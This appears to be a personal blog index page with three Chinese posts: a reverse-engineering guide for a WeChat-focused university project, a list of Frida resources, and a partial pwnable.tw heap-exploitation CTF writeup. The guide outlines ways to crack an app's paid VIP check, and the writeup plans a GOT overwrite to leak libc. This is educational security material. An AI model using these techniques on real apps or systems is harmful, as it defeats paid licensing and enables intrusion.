<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon_io/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon_io/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon_io/favicon-16x16.png">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://google-fonts.mirrors.sjtug.sjtu.edu.cn/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"www.cameudis.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Cameudis&#39; Blog">
<meta property="og:url" content="https://www.cameudis.com/page/3/index.html">
<meta property="og:site_name" content="Cameudis&#39; Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Cameudis">
<meta property="article:tag" content="blog">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://www.cameudis.com/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Cameudis' Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Cameudis' Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Binary Hack, Computer System, Music, and whatever</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-notes">

    <a href="/notes/" rel="section"><i class="fa fa-sticky-note fa-fw"></i>notes</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/link/" rel="section"><i class="fa fa-link fa-fw"></i>links</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/PoRE/52df689bd98e.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/PoRE/52df689bd98e.html" class="post-title-link" itemprop="url">【PoRE#0x05】Proj1 指北</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-04-22 08:34:18" itemprop="dateCreated datePublished" datetime="2023-04-22T08:34:18+08:00">2023-04-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:34:30" itemprop="dateModified" datetime="2024-01-11T16:34:30+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/PoRE/" itemprop="url" rel="index"><span itemprop="name">PoRE</span></a>
                </span>
            </span>

          
            <span id="/Tech/PoRE/52df689bd98e.html" class="post-meta-item leancloud_visitors" data-flag-title="【PoRE#0x05】Proj1 指北" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/PoRE/52df689bd98e.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/PoRE/52df689bd98e.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在上PoRE前，我是Android零基础小白，Java也没写过。<br>刚刚接触那些Lab时，虽然挑战性也是有的，但终归是小打小闹的练习性质，只是助教出的题目。</p>
<p>然后那天，Proj1降临了。</p>
<p>真实软件逆向，而且参考目标还是微信。（微信是操作系统（雾））</p>
<p><img src="http://jyywiki.cn/pages/OS/img/os-classify.jpg" alt="meme"></p>
<p>开始前，前辈和我说过：没有做的时候都会以为这不可能，但其实你可以的。<br>现在做完了PJ1，我也想对后来的同学说：虽然这可能会耗费非常多的时间、精力，但我认为这是值得的！<br>这可是复杂度超高的真实软件、商用软件、<del>以及操作系统软件</del>，逆向成功就已经代表了——你已经有了在安卓世界中遨游的资格。</p>
<p>但是，我当然不会觉得耗费时间多是PJ1的优点。<br>我想在这里总结一些做PJ1的经验，能帮后来者节省一些时间就最好了。</p>
<h2 id="工具-amp-环境"><a href="#工具-amp-环境" class="headerlink" title="工具 &amp; 环境"></a>工具 &amp; 环境</h2><p>在做PJ1时，我们需要准备一个好的调试环境。</p>
<p>最好的调试环境显然是真机，因为性能足够，可以提高调试的体验。如果你有一台备用手机的话，可以尝试网上查询root方法。我的备用手机是红米K30Ultra，使用root方法是Magisk。<br>root成功之后，推荐<a target="_blank" rel="noopener" href="https://github.com/LSPosed/LSPosed">LSPosed</a>模块，这是一个支持Xposed模块的框架，在安卓高版本也可以运行。Magisk有一个<a target="_blank" rel="noopener" href="https://github.com/ViRb3/magisk-frida">MagiskFrida</a>模块可以开机自启Frida-Server，也十分推荐安装。这样一来，Frida和Xposed环境都准备好了。</p>
<p>在模拟器上的调试环境，参考助教的文档说明即可。中间不可避免会遇到问题，这是锻炼定位问题-搜索能力-解决问题能力的好机会。当然，在连续高强度STFW（Search The Friendly Web）之后，是人都不可避免出现头晕、昏昏沉沉、眼冒金星、可能还有腰酸背痛颈椎痛的情况。此时建议出去走走，今天的PJ1就写到这里……</p>
<p>然后就是一些工具的介绍了：</p>
<p><strong>Frida</strong>：Hook主力<br>使用参考<a target="_blank" rel="noopener" href="https://cameudis.github.io/Tech/PoRE/f5ada88c59a3.html">上一期</a><br>由于Frida脚本启动速度极快，对脚本进行修改后，只要在本机上重新启动python脚本就可以看到新的效果，而不需要重启模拟器啥的。因此，推荐即使要开发Xposed模块，也先用Frida进行hook测试。</p>
<p><strong>Xposed框架</strong>：略</p>
<p><strong>DDMS</strong>：动态调试工具<br>在网上搜索DDMS，可以发现这是一个Android Studio已经废弃的功能，但现在依然可以使用，请参考<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4115be69be7d">这篇文章</a>找到它。<br>主要推荐其中的查看控件id功能。当我想要hook某个按钮绑定的onClick函数，可以直接用DDMS查看那个按钮的控件ID，在逆向工具中根据该ID搜索，就可以找到那个控件的引用，从而找到程序在哪里为其注册了onClick函数。</p>
<p><strong>JEB</strong>：逆向工具<br>JEB不能搜索Java代码，我觉得比Jadx难用，并且占内存似乎也要更多。</p>
<p><strong>Jadx</strong>：逆向工具<br>可以直接在生成的Java伪代码中搜索，功能十分强大好用。<br>可以在这里安装：<a target="_blank" rel="noopener" href="https://github.com/skylot/jadx/releases">https://github.com/skylot/jadx/releases</a><br>推荐安装 <code>jadx-gui with bundled JRE</code> 版本，这个版本可以直接在启动脚本里修改JVM的最大内存，防止Jadx在逆向微信的时候爆炸。方法是找到启动脚本（jadx-gui.bat）中的 <code>&quot;-XX:MaxRAMPercentage=xxx&quot;</code>，然后将后面的那个 <code>xx</code> 改得大一点，比如 <code>90.0</code> 之类的。也可以把这条直接改成 <code>-Xmx4g</code> 来指定具体的内存数量。</p>
<p><strong>PKiD</strong>：查壳工具<br>链接：<a target="_blank" rel="noopener" href="http://www.legendsec.org/1888.html">http://www.legendsec.org/1888.html</a><br>可以查询APP有么有加壳，不过比较古老了。如果加了壳的话，很多代码逻辑都不会在APP里直接看到。我遇到的第一个目标就加壳了，用这个软件检测出来了。</p>
<p><strong>FRIDA-DEXDump</strong>：脱壳工具<br>链接：<a target="_blank" rel="noopener" href="https://github.com/hluwa/FRIDA-DEXDump">https://github.com/hluwa/FRIDA-DEXDump</a><br>可以从内存里把dex代码给Dump出来，存到本地之后可以用jadx直接打开那个文件夹，用dump下来的代码进行分析。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>面对一个庞大的APP文件，眼花缭乱的代码（经过混淆之后确实是眼花缭乱），你是否迷茫？反正我是挺迷茫的。<br>思路很重要。我们需要<strong>有目标的逆向</strong>，而不是漫无目的的逆向。</p>
<p>我们首要思考的，就是逆向目标和软件逻辑之间的练习。比如想要做一个广告跳过功能，就可以思考：程序如何启动广告？程序如何关闭广告？最直接的入口，就是广告右上角的跳过或者关闭按钮。从按钮入手，找到点击按钮时的程序逻辑，就一定可以找到跳过广告的方法。</p>
<p>微信发送消息也是类似的。程序在什么时候会发送消息呢？当我们点击发送键的时候。所以发送消息的逻辑一定可以通过按钮来找到。</p>
<p>像跳过广告、发送消息这种有明确按钮，可以在手机上通过点击来进行的操作是最好逆向的。但我们也会遇到很多不好逆向的情况，比如我选的任务目标之一是破解一个软件的会员内购；又比如我的另一个目标是微信机器人，需要逆向找到接受消息的逻辑。这种情况下，没有明显的入口可供我们调用，我们就需要从其他的角度入手。</p>
<p>在破解会员内购中，一种思路是支付的时候伪造成功的回复消息；另一种思路是通过某个界面组件在开通VIP前后的变化，找到用以判断VIP的那个关键逻辑函数。这两者都比前者难找一些，不过都是可行的思路，我前后两个思路都试了一遍才成功。</p>
<p>在微信接受消息中，可能就需要从聊天框中显示的对方发来的消息组件入手，找到它的类、它的父类……不过，我并没有老老实实找，因为PJ1文档中给的一篇<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-226674.htm">参考文章</a>作者已经提供了一个非常有用的信息——微信会把聊天数据存到数据库中。（注意，由于很多数据库API都是以字符串为参数的，这大大方便了逆向时的信息获取）</p>
<h2 id="Trick"><a href="#Trick" class="headerlink" title="Trick"></a>Trick</h2><p>有了思路以后，就需要在开始寻找目标了。在寻找目标时，也有一些能够帮助逆向的小技巧。</p>
<p>其中，最有用的技巧一定是jadx中的<strong>搜索功能</strong>。想要找“发送”按钮就搜索“发送”，想要搜索“跳过广告”就搜索“跳过广告”，想要搜索SQL处理逻辑就搜索“SQL”，想要搜索一个抽象接口类的实现类就搜索那个接口的名字……<br>由于jadx的搜索支持类名、函数名、代码、注释、资源，想要搜什么都可以Ctrl+Shift+F召喚出搜索界面！</p>
<p>此外，还推荐多多使用Frida动静态结合地调试。在jadx中右键某函数后，选择“复制为Frida片段”，粘贴到Frida脚本之后，运行脚本，马上就可以看到那个函数的调用情况、参数以及返回值。比如在一个函数中，有大量的在if中的语句，我们不知道它们是否会被执行，此时就可以hook住那个函数，通过打印参数、打印this的各个域等等方式来打印出真实情况下这些判断条件的值，从而得知真实的执行流是怎样的。</p>
<p>最后，我在逆向时遇到的一个比较逆天的情况是真机环境的微信函数名、类名和我本地的安装包中的函数名、类名是不一样的。我本地的安装包可是直接用真机上的微信导出的啊，真不知道哪里出了问题。一种可能是微信做了安装时混淆，另一种可能是我自己把安装包弄混了。遇到hook不上的情况，可以试试打印可以确定的类的各个域和成员函数，如下代码所示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> listener = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.pluginsdk.ui.chat.q&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> methods = listener.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; methods.<span class="property">length</span>; j++)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(methods[j])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> fields = listener.<span class="property">class</span>.<span class="title function_">getDeclaredFields</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; fields.<span class="property">length</span>; j++)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(fields[j].<span class="title function_">getName</span>())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="领悟（建议）"><a href="#领悟（建议）" class="headerlink" title="领悟（建议）"></a>领悟（建议）</h2><p>面对一个新的情况，最好的办法是先网上搜一下。我感到使用谷歌进行搜索比百度要强一万倍，并且要多进行搜索，中文搜不到换英文再试试。比如像微信这样的软件，网络上一定会有许多已有的逆向资料（比如PJ1文档里助教给的参考文章），多搜多看，说不定就能遇到想找的东西。</p>
<p>在做PJ的时候，一定要注意保护好身体，注意坐姿和眼睛，不要沉迷逆向无法自拔！逆向的时间是过得很快的，并且有时会不断产生新的希望，让人在电脑面前坐着走不开。但很多时候，故意停下来去做别的事情，可能会产生更新更好的思路。<br>（Windows的话可以开个桌面专门当作逆向的工作桌面，这样停下来只要切换桌面就可以干别的事了）</p>
<p>此外，多和好同学交流一下思路、方法论非常有用，同学的思路往往能够大大地启发人！（可能比我写的破文章要更启发人）</p>
<p>最后，Proj1确实是很具有挑战性的一个作业，也是很难忘的一段旅途。我在Proj1里学到了一些东西，希望能帮助我以后解决更大的挑战，也希望能帮助到一些未来的同学~</p>
<p>P.S. 我也觉得PoRE这个难度坡度太大了，直接上真实的软件……或许可以在中间加一些小练习的，比如frida小练习（？）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/PoRE/f5ada88c59a3.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/PoRE/f5ada88c59a3.html" class="post-title-link" itemprop="url">【PoRE#0x04】Frida & Android</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-04-15 21:37:14" itemprop="dateCreated datePublished" datetime="2023-04-15T21:37:14+08:00">2023-04-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:34:30" itemprop="dateModified" datetime="2024-01-11T16:34:30+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/PoRE/" itemprop="url" rel="index"><span itemprop="name">PoRE</span></a>
                </span>
            </span>

          
            <span id="/Tech/PoRE/f5ada88c59a3.html" class="post-meta-item leancloud_visitors" data-flag-title="【PoRE#0x04】Frida & Android" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/PoRE/f5ada88c59a3.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/PoRE/f5ada88c59a3.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><a target="_blank" rel="noopener" href="https://frida.re/">Frida</a>是一个几乎全平台（Windows、MacOS、GNU&#x2F;Linux、IOS、<strong>Android</strong>）的<strong>代码插桩</strong>软件。它能够把谷歌的V8引擎（JavaScript、WebAssembly引擎，即解释器）注入到目标进程中，允许我们编写的JS脚本拥有对于整个进程内存空间的访问权、Hook进程里的代码、直接调用它们等……</p>
<p>Frida功能强大，且使用非常便捷、快速。比如在Android平台，Xposed模块也一样可以做到插桩，但调试起来麻烦得多，每次都要生成APK、安装APK、添加模块、重启环境。而Frida甚至不需要编译！官网对它的描述是 <em>Scriptable</em>，编辑后运行，直接就能够看到结果——你甚至不用重开目标进程！</p>
<p>如何使用Frida？Frida包括一个需要在目标机器上运行的<strong>Frida Server</strong>，同时，在本机上（用于写脚本的机器）提供了命令行工具（Frida CLI tool）、也可以用Python调用Frida API或直接编写JS脚本。</p>
<p>本笔记收集了一些安卓使用Frida的资源。</p>
<p>推荐食用方法是：</p>
<ol>
<li>安装：如果你是PoRE学生，可以直接用助教给的方法，在虚拟机进行安装配置。否则可以参考官网文档。<br> 如果想要用真机进行调试，最好确保使用备用手机，可以使用magisk进行root，可以用一个magisk模块自动开机自启frida服务器，名为MagiskFrida。</li>
<li>从（助教给的例子或）官网的Example中学习，跑跑脚本并改一改脚本，学习Frida &amp; Android的基础用法。</li>
<li>你已经可以直接上手了。遇到想要hook但不知道怎么hook的内容，从第三个链接（Sakura大佬的博客）那边可以学习如何使用，如何new一个类、如何获取一个类的实例等。</li>
<li>python脚本与目标进程通信允许我们在主机上也能放一些逻辑，再加上python强大的第三方库支持，我们可以整很多活。等hook成功了之后，看看第四个链接的内容，想想可以整什么活。</li>
<li>最后是第五个链接，完整的官方文档，可以备着，想要实现某个奇怪的功能或了解某个接口的具体用法时查看。</li>
</ol>
<p>安装配置：<a target="_blank" rel="noopener" href="https://frida.re/docs/android/">官网Android安装文档</a><br>官网Android Example（可以从注释学到基础用法）：<a target="_blank" rel="noopener" href="https://frida.re/docs/examples/android/">Android | Frida</a><br>大部分用法教程与示例：<a target="_blank" rel="noopener" href="https://eternalsakura13.com/2020/07/04/frida/">Frida Android hook | Sakuraのblog</a><br>目标进程与本地python脚本通信教程：<a target="_blank" rel="noopener" href="https://frida.re/docs/messages/">Messages | Frida</a><br>详细的文档：<a target="_blank" rel="noopener" href="https://frida.re/docs/javascript-api/">JavaScript API | Frida</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/f6c454d44380.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Pwn/f6c454d44380.html" class="post-title-link" itemprop="url">【Pwn#0x10】pwnable.tw Re-alloc writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-04-13 23:03:41" itemprop="dateCreated datePublished" datetime="2023-04-13T23:03:41+08:00">2023-04-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:30:39" itemprop="dateModified" datetime="2024-01-11T16:30:39+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
                </span>
            </span>

          
            <span id="/Tech/Pwn/f6c454d44380.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x10】pwnable.tw Re-alloc writeup" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Pwn/f6c454d44380.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/f6c454d44380.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>相关：realloc、tcache2.29</p>
<p>借用了很多巧合，实在是特别“幸运”的一个利用。<br>自己做出来之后，发现网上大部分wp都和我的解法不一样，但是更通用一些，不像我的那么极限（草）。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>保护情况：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>

<p>程序是一个菜单，提供了alloc、realloc、free功能，来操作bss段的两个栏位，大致功能如下：</p>
<ul>
<li>alloc：选中栏当前为NULL时，使用 realloc(NULL, size) 分配新的区块并读入数据；</li>
<li>realloc：选中栏当前非NULL时，将选中栏使用 realloc(ptr, size) 来调整大小并（如果realloc返回值非0）读入数据；</li>
<li>free：将选中栏使用 realloc(ptr, 0) 进行释放，并<strong>将指针置零</strong>。</li>
</ul>
<p>主要的漏洞在于realloc的使用上，可以通过RTFM（在线man地址：<a target="_blank" rel="noopener" href="https://linux.die.net/man/3/realloc">realloc(3): allocate&#x2F;free dynamic memory - Linux man page</a>）得到realloc的说明：</p>
<blockquote>
<p>The <strong>realloc</strong>() function changes the size of the memory block pointed to by <em>ptr</em> to <em>size</em> bytes. The contents will be unchanged in the range from the start of the region up to the minimum of the old and new sizes. If the new size is larger than the old size, the added memory will <em>not</em> be initialized. If <em>ptr</em> is NULL, then the call is equivalent to <em>malloc(size)</em>, for all values of <em>size</em>; if <em>size</em> is equal to zero, and <em>ptr</em> is not NULL, then the call is equivalent to <em>free(ptr)</em>. Unless <em>ptr</em> is NULL, it must have been returned by an earlier call to <strong>malloc</strong>(), <strong>calloc</strong>() or <strong>realloc</strong>(). If the area pointed to was moved, a <em>free(ptr)</em> is done.</p>
</blockquote>
<p>注意到，当ptr字段为0，realloc等价于malloc；当ptr不为0但size为0时，realloc等价于free。</p>
<p>程序确实使用这两种功能来实现了malloc以及free，但是在realloc和free功能中，检查做得不够完善：</p>
<ul>
<li>当realloc中输入size为0，可以<strong>触发free，且不将原指针置零</strong>，创造了UAF的可能。</li>
<li>使用free作用于空栏位（NULL），可以触发一次匿名的malloc(0)。这里的匿名指的是结果不会保存在bss段结构中，因为free会将其置零。</li>
</ul>
<p>其实另外还在alloc功能中发现了一个Off-by-NULL漏洞，但我并没有想到很好的办法来用到这个漏洞。</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>在宏观的层面上，由于程序二进制本身虽然关闭了PIE，但没有特别有用的函数，因此思路还是两步走：泄露libc地址、劫持控制流。</p>
<h3 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h3><p>程序本身并没有能够提供打印区块数据的功能，因此想要泄露libc数据就一定需要劫持控制流。<br>目前，栈地址未知排除ROP，将目标瞄准GOT：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">off_404018 dq offset _exit  </span><br><span class="line">off_404020 dq offset __read_chk</span><br><span class="line">off_404028 dq offset puts</span><br><span class="line">off_404030 dq offset __stack_chk_fail</span><br><span class="line">off_404038 dq offset printf</span><br><span class="line">off_404040 dq offset alarm</span><br><span class="line">off_404048 dq offset atoll</span><br><span class="line">off_404050 dq offset signal</span><br><span class="line">off_404058 dq offset realloc</span><br><span class="line">off_404060 dq offset setvbuf</span><br><span class="line">off_404068 dq offset __isoc99_scanf</span><br></pre></td></tr></table></figure>

<p>首先思考可不可以把唯一操作区块的外部函数——realloc替换为puts来泄露地址，笔者这时顾忌到题目限制了区块大小，不太方便构造 unsorted bin 中的区块。<br>因此将目标瞄准了atoll，这个函数在read_long中被调用，参数是栈上用来读入数字的buffer。可以尝试用它来泄露栈上的数据。</p>
<p>这时一个好主意是使用plt[printf]代替atoll，这样就可以在栈上指哪打哪，可惜笔者做的时候并没有想到这个好主意，只是用了plt[puts]。不过不影响，因为我遇到了第一个逆天的巧合：<strong>在buffer+8的位置就有一个libc地址</strong>。先介绍一下怎么覆写的：</p>
